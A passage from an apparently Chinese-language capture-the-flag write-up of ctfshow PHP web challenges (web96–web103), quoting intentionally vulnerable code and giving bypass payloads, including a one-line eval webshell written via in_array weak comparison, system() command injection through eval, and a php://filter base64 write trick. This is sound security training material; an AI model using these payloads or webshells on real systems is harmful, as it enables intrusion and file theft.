class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]==<span class="string">&#x27;flag.php&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>读取文件，参数不等于flag.php，那直接加个<code>./</code>即可（<code>./</code>代表目前所在的目录，<code>. ./</code>代表上一层目录。<code>/</code>代表根目录），有多种办法，php伪协议也可以</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?u=./flag.php</span><br><span class="line">或者</span><br><span class="line">?u=file:///var/www/html/flag.php</span><br></pre></td></tr></table></figure><p>​      </p><h3 id="web97"><a href="#web97" class="headerlink" title="web97"></a>web97</h3><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-18 19:36:32</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] != <span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])</span><br><span class="line"><span class="keyword">if</span> (md5(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === md5(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]))</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>使用数组绕过 <a href="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/PHP%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83.html">PHP弱类型比较.html</a> </p><blockquote><p>php的md5( string $str[, bool $raw_output = FALSE] ) ，md5()函数的需要一个string类型的参数。当传入一个array时，md5()不会报错，无法求出array的md5值，结果为NULL, 这就会导致任意2个array的md5值都会相等。</p></blockquote><p>所以我们使用两个数组</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a[]=1&amp;b[]=2</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web97.png"></p><p>​      </p><h3 id="web98"><a href="#web98" class="headerlink" title="web98"></a>web98</h3><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-18 21:39:27</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$_GET</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_POST</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_COOKIE</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_SERVER</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line">highlight_file(<span class="variable">$_GET</span>[<span class="string">&#x27;HTTP_FLAG&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$flag</span>:<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>这里是三目运算符和取地址，第二行和第三行是无用的，因为我们不传flag参数，所以我们分析一下第一行和第四行</p><blockquote><p>第一行：如果存在get传参，则把post传参地址给get，可以简单理解为post覆盖了get<br>第四行：如果get参数<code>HTTP_FLAG</code>的值为flag，就读取文件，也就是输出flag</p></blockquote><p>所以思路就是使用POST传递<code>HTTP_FLAG</code>的值为flag，覆盖GET，输出flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?a=test</span><br><span class="line">[POSTdata]为 HTTP_FLAG=flag</span><br></pre></td></tr></table></figure><p>​      </p><h3 id="web99"><a href="#web99" class="headerlink" title="web99"></a>web99</h3><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-18 22:36:12</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$allow</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">36</span>; <span class="variable">$i</span> &lt; <span class="number">0x36d</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">    array_push(<span class="variable">$allow</span>, rand(<span class="number">1</span>,<span class="variable">$i</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>]) &amp;&amp; in_array(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$allow</span>))&#123;</span><br><span class="line">    file_put_contents(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>首先是创建一个数组，使用 array_push($allow, rand(1,$i)) 从36到0x36d进行数组的随机填充；当我们GET传的参数在该数组时，使用file_put_content()函数以GET传入的参数为文件名，POST传入数据写入数据库。</p><blockquote><p>in_array() 函数搜索数组中是否存在指定的值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php</span><br><span class="line">in_array(search,array,type)</span><br></pre></td></tr></table></figure><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><em>search</em></td><td align="left">必需。规定要在数组搜索的值。</td></tr><tr><td align="left"><em>array</em></td><td align="left">必需。规定要搜索的数组。</td></tr><tr><td align="left"><em>type</em></td><td align="left">可选。如果设置该参数为 true，则检查搜索的数据与数组的值的类型是否相同。</td></tr></tbody></table><p><strong>说明</strong></p><p>如果给定的值 <em>search</em> 存在于数组 <em>array</em> 中则返回 true。如果第三个参数设置为 true，函数只有在元素存在于数组中且数据类型与给定值相同时才返回 true。</p><p>如果没有在数组中找到参数，函数返回 false。</p><p>注释：如果 <em>search</em> 参数是字符串，且 <em>type</em> 参数设置为 true，则搜索区分大小写。</p></blockquote><p>这里in_array()函数在没有第三个值得时候会进行弱比较，也就是存在强制转换，即333.php此时会被转换为333，所以思路为数字命名.php文件，写入webshell。payload如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?n=4.php</span><br><span class="line">[POSTdata]为 content=&lt;?php @eval($_POST[a]);?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web99-1.png"></p><p>随后访问webshell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">4.php</span><br><span class="line">【POSTdata】为</span><br><span class="line">a=system(&quot;ls&quot;);</span><br><span class="line">a=system(&quot;tac flag36d.php&quot;);</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web99.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web99-2.png"></p><p>​      </p><h3 id="web100"><a href="#web100" class="headerlink" title="web100"></a>web100</h3><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-21 22:10:28</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;ctfshow.php&quot;</span>);</span><br><span class="line"><span class="comment">//flag in class ctfshow;</span></span><br><span class="line"><span class="variable">$ctfshow</span> = <span class="keyword">new</span> ctfshow();</span><br><span class="line"><span class="variable">$v1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v0</span>=is_numeric(<span class="variable">$v1</span>) <span class="keyword">and</span> is_numeric(<span class="variable">$v2</span>) <span class="keyword">and</span> is_numeric(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v0</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;/&quot;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/\;/&quot;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$v2</span>(&#x27;ctfshow&#x27;)<span class="subst">$v3</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>创建一个对象，传入3个值，并使用is_numeric()函数判断变量是否为数字或数字字符串，如果 <code>var</code> 是数字和数字字符串则返回 **<code>TRUE</code>**，否则返回 **<code>FALSE</code>**。 如果TRUE则判断v2,v3是否带有分号。</p><p>看到最后eval，肯定是需要命令执行，这需要<code>$v2</code>传入命令(system)，<code>$v3</code>需要<code>;</code>结尾，但这么一来就变成了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$vo = $v1 and FALSE and FAlse</span><br></pre></td></tr></table></figure><p>但php有运算的优先级，也就是<code>&amp;&amp; &gt; = &gt; and</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$vo = TRUE and FALSE and FAlse</span><br></pre></td></tr></table></figure><p>按照运算优先级，先执行<code>=</code>也就是赋值给$vo为true，false就被忽略了，所以我们正常构造payload即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?v1=1&amp;v2=system(&quot;ls&quot;)&amp;v3=;</span><br><span class="line">?v1=1&amp;v2=system(&quot;tac ctfshow.php&quot;)&amp;v3=;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web100.png"></p><p>拿到 flag_is_5dc3b6e70x2dfd860x2d43190x2da7530x2d76d4762a84a4</p><p>0x2d替换成-</p><p>ctfshow{5dc3b6e7-fd86-4319-a753-76d4762a84a4}</p><p>另一种解法，题目说//flag in class ctfshow;所以我们可以var_dump看看咯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1=1&amp;v2=var_dump($ctfshow)&amp;v3=;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web100-1.png"></p><p>同样可以拿到flag</p><p>​      </p><h3 id="web101"><a href="#web101" class="headerlink" title="web101"></a>web101</h3><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-22 00:26:48</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;ctfshow.php&quot;</span>);</span><br><span class="line"><span class="comment">//flag in class ctfshow;</span></span><br><span class="line"><span class="variable">$ctfshow</span> = <span class="keyword">new</span> ctfshow();</span><br><span class="line"><span class="variable">$v1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v0</span>=is_numeric(<span class="variable">$v1</span>) <span class="keyword">and</span> is_numeric(<span class="variable">$v2</span>) <span class="keyword">and</span> is_numeric(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v0</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\;|\?|[0-9]/&quot;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\?|[0-9]/&quot;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$v2</span>(&#x27;ctfshow&#x27;)<span class="subst">$v3</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>与上一把不同的就是过滤变多了，所以上把payload不能用了。这题使用的是类反射的知识</p><blockquote><p>PHP Reflection API是PHP5才有的新功能，它是用来导出或提取出关于类、方法、属性、参数等的详细信息，包括注释。<br>$class = new ReflectionClass(‘ctfshow’); // 建立 Person这个类的反射类<br>$instance = $class-&gt;newInstanceArgs($args); // 相当于实例化ctfshow类</p></blockquote><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1=1&amp;v2=echo new Reflectionclass&amp;v3=;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web101.png"></p><p>$flag_8478ef7b0x2d35a10x2d49300x2d9b4b0x2d526964cb7f7 ]</p><p>0x2d改成-</p><p>ctfshow{8478ef7b-35a1-4930-9b4b-526964cb7f7} 末尾还缺一位，0-9  a-f ，一共16中可能，试一下是1</p><p>ctfshow{8478ef7b-35a1-4930-9b4b-526964cb7f71}</p><p>​      </p><h3 id="web102"><a href="#web102" class="headerlink" title="web102"></a>web102</h3><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: atao</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-23 20:59:43</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v4</span> = is_numeric(<span class="variable">$v2</span>) <span class="keyword">and</span> is_numeric(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v4</span>)&#123;</span><br><span class="line">    <span class="variable">$s</span> = substr(<span class="variable">$v2</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="variable">$str</span> = call_user_func(<span class="variable">$v1</span>,<span class="variable">$s</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line">    file_put_contents(<span class="variable">$v3</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>了解函数</p><blockquote><p><strong>is_numeric()</strong> 函数用于检测变量是否为数字或数字字符串，如果指定的变量是数字和数字字符串则返回true，否则返回false。如果字符串中含有一个e代表科学计数法，也可返回true</p><p><strong>substr()</strong> 截取字符串</p><p><strong>call_user_func()</strong> 函数用于调用方法或者变量，第一个参数是被调用的函数，第二个是调用的函数的参数</p><p><strong>file_put_contents()</strong> 函数应该都熟悉了，写入内容到文件中，第一个参数是文件名，第二个参数是内容</p></blockquote><p>我们需要输入v1v2v3，先保证v2为纯数字或数字字符串v4才能为真，随后从下标为2开始截取v2赋值给s，s作为参数到v1执行结果赋值给str，最后将str写入v3。所以v1我们要传入一个方法</p><p>思路：将payload先以base64加密，再以16进制加密</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$b</span> = base64_encode(<span class="string">&#x27;&lt;?=`tac *`;&#x27;</span>);</span><br><span class="line"><span class="variable">$b</span> = str_replace(<span class="string">&quot;=&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;base64加密后:&quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> = call_user_func(<span class="string">&#x27;bin2hex&#x27;</span>,<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;16进制形式:&quot;</span>.<span class="variable">$a</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">var_dump(is_numeric(<span class="variable">$a</span>));</span><br><span class="line"><span class="comment">/*运行结果base64加密后:PD89YHRhYyAqYDs </span></span><br><span class="line"><span class="comment">16进制形式:504438395948526859794171594473</span></span><br><span class="line"><span class="comment">bool(true)*/</span></span><br></pre></td></tr></table></figure><?= 是php短标签，相当于echo()$v4 = is_numeric($v2) and is_numeric($v3);因为运算级的关系，if($v4){ }的真假只与v2有关(参考web100)<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?v2=00504438395948526859794171594473&amp;v3=php://filter/write=convert.base64-decode/resource=2.php</span><br><span class="line"></span><br><span class="line">post:</span><br><span class="line">v1=hex2bin</span><br></pre></td></tr></table></figure>随后访问2.php文件即可，flag在源码中​       ### web103源码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: atao</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-23 21:03:24</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v4</span> = is_numeric(<span class="variable">$v2</span>) <span class="keyword">and</span> is_numeric(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span 